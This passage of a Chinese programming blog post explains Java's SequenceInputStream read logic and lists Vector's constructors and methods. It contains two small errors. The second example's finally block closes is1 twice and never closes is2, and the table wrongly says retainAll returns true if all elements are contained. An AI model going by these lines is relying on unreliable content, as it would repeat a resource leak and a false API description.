...省略部分代码...\n}\n</code></pre>\n<p>如果使用者用的是2个被装饰的输入Stream（此处为FileInputStream），构造的SequenceInputStream的对象，如下所示（伪代码）：</p>\n<pre><code>is1 = new FileInputStream(\"D:\\\\data1.txt\");\nis2 = new FileInputStream(\"D:\\\\data2.txt\");\nsequenceInputStream = new SequenceInputStream(is1, is2);\n</code></pre>\n<p>那么，SequenceInputStream对象中Vector集合的容量是2，如果此时执行SequenceInputStream.class::read()函数。</p>\n<pre><code>//伪代码\nint readByte = -1;\nwhile ((readByte = sequenceInputStream.read()) != -1) {\n   System.out.print((char) readByte);\n}\n</code></pre>\n<p>过程如下（假设2个被装饰的输入Stream（此处为FileInputStream）中的字节数据如下）：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>①、先执行第1个被装饰的输入Stream（也是Vector集合的第1个元素）的read()函数，直到该函数返回-1，如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>②、关闭第1个被装饰的输入Stream（也是Vector集合的第1个元素），再执行第2个被装饰的输入Stream（也是Vector集合的第2个元素）的read()函数，直到该函数返回-1，如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<h6 id=\"111使用举例\">1.1.1、使用举例</h6>\n<p>  下面这个例子就恰当的使用SequenceInputStream的read()函数；</p>\n<ul>\n<li>\n<p>我的windows操作系统的D盘根目录下有2个txt文件，一个是data1.txt，另一个是data2.txt文件，这2个文件中总共有30个字节，如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n</li>\n<li>\n<p>使用者可以用一个SequenceInputStream对象装饰2个被装饰的输入Stream（此处为FileInputStream），如下代码所示：</p>\n</li>\n</ul>\n<pre><code>package com.chelong.StreamAndReader;\n\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.SequenceInputStream;\n\npublic class SequenceInputStreamTest {\n   public static void main(String[] args) {\n      InputStream is1 = null;\n      InputStream is2 = null;\n      SequenceInputStream sequenceInputStream = null;\n      try {\n         is1 = new FileInputStream(\"D:\\\\data1.txt\");\n         is2 = new FileInputStream(\"D:\\\\data2.txt\");\n         sequenceInputStream = new SequenceInputStream(is1, is2);\n         int readByte = -1;\n         while ((readByte = sequenceInputStream.read()) != -1) {\n            System.out.print((char) readByte);\n         }\n      } catch (IOException e) {\n         e.printStackTrace();\n      } finally {\n          //此处省略关闭所有的Stream的代码\n      }\n   }\n}\n</code></pre>\n<p>程序运行结果，如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<h5 id=\"12sequenceinputstream的readbyte-b-int-off-int-len函数和nextstream函数\">1.2、SequenceInputStream的read(byte b[], int off, int len)函数和nextStream()函数</h5>\n<pre><code>package java.io;\nimport java.io.InputStream;\nimport java.util.Enumeration;\nimport java.util.Vector;\n\npublic\nclass SequenceInputStream extends InputStream {\n    ...省略部分代码...\n    //顺序（序列化）装载多个被装饰输入Stream的集合，一般是Vector实例\n    Enumeration&lt;? extends InputStream&gt; e;\n    InputStream in;//顺序（序列化）装载多个被装饰输入Stream的集合中当前正在被SequenceInputStream 对象使用的被装饰的输入Stream\n    //获取集合中下一个被装饰的输入Stream\n    final void nextStream() throws IOException {\n        if (in != null) {\n            in.close();//先关闭当前被装饰的输入Stream\n        }\n\n        if (e.hasMoreElements()) {//如果集合中还有被装饰的输入Stream\n            in = (InputStream) e.nextElement();//获取集合中下一个被装饰的输入Stream\n            if (in == null)\n                throw new NullPointerException();//如果集合中下一个被装饰的输入Stream为null，抛出一个NullPointerException\n        }\n        else in = null;//如果集合中没有了被装饰的输入Stream，将当前正在使用的被装饰的输入Stream置为null\n\n    }\n    \n    //从SequenceInputStream 对象的集合（该集合放着多个被装饰的输入Stream）中读取len个字节，放入到byte[]数组b的[off,off+len)（左闭右开，不包括off+len）索引位置\n    public int read(byte b[], int off, int len) throws IOException {\n        if (in == null) {//如果in==null，则说明当前这个SequenceInputStream 对象的集合中所有被装饰的输入Stream都已经关闭\n            return -1;\n        } else if (b == null) {\n            throw new NullPointerException();//如果byte[]数组b==null，抛出一个NullPointerException\n        } else if (off &lt; 0 || len &lt; 0 || len &gt; b.length - off) {//相当于off + len &gt; b.length（源码中这样写代码的好处我没看出来）\n            throw new IndexOutOfBoundsException();\n        } else if (len == 0) {\n            return 0;//要从SequenceInputStream 对象的集合（该集合放着至少2个被装饰的输入Stream）中读取的len个字节==0时，返回0\n        }\n        do {\n            int n = in.read(b, off, len);//从当前正在使用的被装饰的输入Stream中读取len个字节，放入到byte[]数组b的[off,off+len)（左闭右开，不包括off+len）索引位置\n            if (n &gt; 0) {\n                return n;//只要能从当前正在使用的被装饰的输入Stream中读取到字节，则返回读取的数量\n            }\n            nextStream();//此时n==-1，说明当前正在使用的被装饰的输入Stream中字节（byte）数据已经读完，获取SequenceInputStream 对象的集合中下一个被装饰的输入Stream\n        } while (in != null);//SequenceInputStream 对象的集合中下一个被装饰的输入Stream为null时，跳出循环，返回-1\n        return -1;\n    }\n    ...省略部分代码...\n}\n</code></pre>\n<p>如果使用者用的是2个被装饰的输入Stream（此处为FileInputStream），构造的SequenceInputStream的对象，如下所示（伪代码）：</p>\n<pre><code>is1 = new FileInputStream(\"D:\\\\data1.txt\");\nis2 = new FileInputStream(\"D:\\\\data2.txt\");\nsequenceInputStream = new SequenceInputStream(is1, is2);\n</code></pre>\n<p>那么，SequenceInputStream对象中Vector集合的容量是2，并且假设这2个被装饰的输入Stream（此处为FileInputStream）中的字节数据如下：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>如果此时执行SequenceInputStream.class::read()函数。接下来使用SequenceInputStream对象读取字节数据到使用者创建的byte[]数组，如果使用者创建的字节数组byte[]的长度&gt;=第1个被装饰的输入Stream中的所有字节个数，比如，使用者创建的byte[]数组的长度为12，如下所示（伪代码）：</p>\n<pre><code>int readByte = -1;\nbyte[] buff = new byte[12];\nwhile ((readByte = sequenceInputStream.read(buff, 0, buff.length)) != -1) {\n   for (int i = 0; i &lt; readByte; i++) {\n      System.out.print((char) buff[i]);\n   }\n}\n</code></pre>\n<p>整个执行过程如下：<br />\n①、第1次进入read()函数<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>②、第2次进入read()函数（<em><strong>重点是当前正在使用的被装饰的输入Stream中的字节数据已经读取完了时，再次读取，会返回-1，不会返回0</strong></em>）<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>③、第3次进入read()函数<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>④、第4次进入read()函数（<em><strong>重点是当前正在使用的被装饰的输入Stream中的字节数据已经读取完了时，再次读取，会返回-1，不会返回0</strong></em>）<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>最终使用者创建的byte[]数组中的字节（byte）数据，如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<h6 id=\"121使用举例\">1.2.1、使用举例</h6>\n<p>  下面这个例子就恰当的使用SequenceInputStream的read()函数；</p>\n<ul>\n<li>\n<p>我的windows操作系统的D盘根目录下有2个txt文件，一个是data1.txt，另一个是data2.txt文件，这2个文件中总共有30个字节，如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n</li>\n<li>\n<p>使用者可以用一个SequenceInputStream对象装饰2个被装饰的输入Stream（此处为FileInputStream），如下代码所示：</p>\n</li>\n</ul>\n<pre><code>package com.chelong.StreamAndReader;\n\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.SequenceInputStream;\nimport java.util.Vector;\n\npublic class SequenceInputStreamTest {\n   public static void main(String[] args) {\n      InputStream is1 = null;\n      InputStream is2 = null;\n      SequenceInputStream sequenceInputStream = null;\n      try {\n         is1 = new FileInputStream(\"D:\\\\data1.txt\");\n         is2 = new FileInputStream(\"D:\\\\data2.txt\");\n         Vector&lt;InputStream&gt; vector = new Vector&lt;InputStream&gt;();\n         vector.addElement(is1);\n         vector.addElement(is2);\n         sequenceInputStream = new SequenceInputStream(vector.elements());\n         int readByte = -1;\n         byte[] buff = new byte[12];\n         while ((readByte = sequenceInputStream.read(buff, 0, buff.length)) != -1) {\n            for (int i = 0; i &lt; readByte; i++) {\n               System.out.print((char) buff[i]);\n            }\n         }\n         System.out.println();\n         System.out.println(\"最终留在byte[]数组buff中的字节：\");\n         for (byte b : buff) {\n            System.out.print((char) b);\n         }\n      } catch (IOException e) {\n         e.printStackTrace();\n      } finally {\n         try {\n            if (is1 != null) is1.close();\n            if (is2 != null) is1.close();\n            if (sequenceInputStream != null) sequenceInputStream.close();\n         } catch (IOException e) {\n            e.printStackTrace();\n         }\n      }\n   }\n}\n</code></pre>\n<p>程序运行结果，如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<h4 id=\"二vectorclass的一些函数说明\">二、Vector.class的一些函数说明</h4>\n<p>  Vector 与 ArrayList 一样，也是通过数组实现的，不同的是它支持线程的同步，即某一时刻只有一个线程能够写 Vector，避免多线程同时写而引起的不一致性，但实现同步需要很高的花费，因此，访问它比访问 ArrayList慢。Vector的UML图，如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<h5 id=\"21构造函数\">2.1、构造函数</h5>\n<table>\n<thead>\n<tr>\n<th style=\"text-align: left;\">函数名</th>\n<th style=\"text-align: left;\">函数说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align: left;\">public Vector()</td>\n<td style=\"text-align: left;\">此构造函数创建的Vector中，Object[]数组的初始长度为10，capacityIncrement=0（capacityIncrement表示扩容时Object[]数组增加的长度，如果等于0的话，当Object[]数组需要扩容时，新的数组长度=2*旧数组的长度，但是新的数组长度最大为2^31-8）</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">public Vector(int initialCapacity)</td>\n<td style=\"text-align: left;\">此构造函数创建的Vector中，Object[]数组的初始长度为initialCapacity，capacityIncrement=0（capacityIncrement表示扩容时Object[]数组增加的长度，如果等于0的话，当Object[]数组需要扩容时，新的数组长度=2*旧数组的长度，但是新的数组长度最大为2^31-8）</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">public Vector(int initialCapacity, int capacityIncrement)</td>\n<td style=\"text-align: left;\">此构造函数创建的Vector中，Object[]数组的初始长度为initialCapacity，capacityIncrement=capacityIncrement（capacityIncrement表示扩容时Object[]数组增加的长度，如果等于0的话，当Object[]数组需要扩容时，新的数组长度=2*旧数组的长度，但是新的数组长度最大为2^31-8）</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">public Vector(Collection&lt;? extends E&gt; c)</td>\n<td style=\"text-align: left;\">此构造函数创建的Vector中，Object[]数组的初始长度为传入集合Collection&lt;? extends E&gt; c的长度，capacityIncrement=0（capacityIncrement表示扩容时Object[]数组增加的长度，如果等于0的话，当Object[]数组需要扩容时，新的数组长度=2*旧数组的长度，但是新的数组长度最大为2^31-8）</td>\n</tr>\n</tbody>\n</table>\n<p>2.2、常用函数</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align: left;\">函数名</th>\n<th style=\"text-align: left;\">函数说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align: left;\">boolean add(E o)</td>\n<td style=\"text-align: left;\">此函数将指定的元素追加到此Vector的末尾，该函数与addElement()函数的区别是，该()函数是List.interface接口规定的函数，addElement()函数是Vector自己实现的（接口中没有规定addElement()函数）</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">void add(int index, E element)</td>\n<td style=\"text-align: left;\">此函数将指定的元素插入此Vector中的指定索引位置</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">boolean addAll(Collection&lt;? extends E&gt; c)</td>\n<td style=\"text-align: left;\">此函数将指定Collection中的所有元素追加到此Vector的末尾</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">boolean addAll(int index, Collection&lt;? extends E&gt; c)</td>\n<td style=\"text-align: left;\">此函数将指定Collection中的所有元素插入到此Vector中的指定索引位置</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">void addElement(E obj)</td>\n<td style=\"text-align: left;\">此函数将指定的元素追加到此Vector的末尾，这个函数与add()函数的区别是，add()函数是List.interface接口规定的函数，这个函数是Vector自己实现的（接口中没有规定该函数）</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">int capacity()</td>\n<td style=\"text-align: left;\">此函数返回此Vector的当前容量</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">void clear()</td>\n<td style=\"text-align: left;\">此函数从此Vector中删除所有元素</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">Object clone()</td>\n<td style=\"text-align: left;\">此函数返回此Vector的克隆对象</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">boolean contains(Object elem)</td>\n<td style=\"text-align: left;\">如果此Vector包含指定的元素，则此函数返回true</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">boolean containsAll(Collection&lt;?&gt; c)</td>\n<td style=\"text-align: left;\">如果此Vector包含指定Collection中的所有元素，则此函数返回true</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">void copyInto(Object[] anArray)</td>\n<td style=\"text-align: left;\">此方法将此向量的组件复制到指定的数组中</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">E elementAt(int index)</td>\n<td style=\"text-align: left;\">此函数返回Vector指定索引处的元素</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">Enumeration elements()</td>\n<td style=\"text-align: left;\">此函数返回此Vector中所包含的所有元素的枚举。</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">void ensureCapacity(int minCapacity)</td>\n<td style=\"text-align: left;\">此函数可增加此Vector的容量，以确保它至少可以保存最小容量元素个数</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">boolean equals(Object o)</td>\n<td style=\"text-align: left;\">此函数将指定的Object与此Vector进行比较以获得相等性</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">E firstElement()</td>\n<td style=\"text-align: left;\">返回此Vector的第一个元素（位于Object[]数组索引 0 处的元素）</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">E get(int index)</td>\n<td style=\"text-align: left;\">返回Vector中指定索引位置的元素</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">int indexOf(Object elem)</td>\n<td style=\"text-align: left;\">搜索给定参数的第一个匹配项，使用 equals ()函数测试相等性</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">int indexOf(Object elem, int index)</td>\n<td style=\"text-align: left;\">搜索给定参数的第一个匹配项，从 index 处开始搜索，并使用 equals()函数测试其相等性</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">void insertElementAt(E obj, int index)</td>\n<td style=\"text-align: left;\">将指定对象作为此Vector中的元素插入到指定的 索引位置</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">boolean isEmpty()</td>\n<td style=\"text-align: left;\">测试此Vector中的是否不包含任何元素</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">E lastElement()</td>\n<td style=\"text-align: left;\">返回此Vector的最后一个元素（位于Object[]数组索引 Object[].length-1 处的元素）</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">int lastIndexOf(Object elem)</td>\n<td style=\"text-align: left;\">返回指定的对象在此Vector中最后一个匹配项的索引</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">int lastIndexOf(Object elem, int index)</td>\n<td style=\"text-align: left;\">从指定的索引处开始向后搜索指定的对象，并返回搜索到的最后一个索引</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">E remove(int index)</td>\n<td style=\"text-align: left;\">移除此Vector中指定索引位置的元素</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">boolean remove(Object o)</td>\n<td style=\"text-align: left;\">移除此Vector中指定元素的第一个匹配项，如果此Vector不包含该元素，则所有元素保持不变，并返回false</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">boolean removeAll(Collection&lt;?&gt; c)</td>\n<td style=\"text-align: left;\">从此Vector中移除包含在指定 Collection 中的所有元素</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">void removeAllElements()</td>\n<td style=\"text-align: left;\">从此Vector中移除全部元素，并设置elementCount=0（该变量表示此Vector对象中有效元素的数量），Object[]数组的长度不变。</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">void removeElementAt(int index)</td>\n<td style=\"text-align: left;\">删除指定索引处的元素</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">protected void removeRange(int fromIndex, int toIndex)</td>\n<td style=\"text-align: left;\">从此 Vector 中移除索引位于 [fromIndex, toIndex)（左闭右开）之间的所有元素</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">boolean retainAll(Collection&lt;?&gt; c)</td>\n<td style=\"text-align: left;\">如果此Vector中包含指定 Collection 中的所有元素，此函数返回true</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">E set(int index, E element)</td>\n<td style=\"text-align: left;\">用指定的元素替换此Vector中指定索引处的元素</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">void setElementAt(E obj, int index)</td>\n<td style=\"text-align: left;\">将此Vector指定 索引处的元素设置为指定的另一个元素</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">void setSize(int newSize)</td>\n<td style=\"text-align: left;\">设置此Vector的大小</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">int size()</td>\n<td style=\"text-align: left;\">返回此Vector中的元素数</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">List subList(int fromIndex, int toIndex)</td>\n<td style=\"text-align: left;\">返回此 Vector的子集，该子集的元素范围为 [fromIndex, toIndex)（左闭右开）索引位置的所有元素</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">Object[] toArray()</td>\n<td style=\"text-align: left;\">返回一个Object[]数组，包含此Vector中以正确顺序存放的所有元素</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">String toString()</td>\n<td style=\"text-align: left;\">返回此Vector的字符串表示形式，其中包含每个元素的 String 表示形式</td>\n</tr>\n</tbody>\n</table>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-15 22:25</span>&nbsp;\n<a href=\"https://www.cnblogs.com/Carey-ccl\">Carey_ccl</a>&nbsp;\n阅读(<span id=\"post_view_count\">18</span>)&nbsp;\n评论(<span id=\"post_comment_count\">1</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    }
  ]
}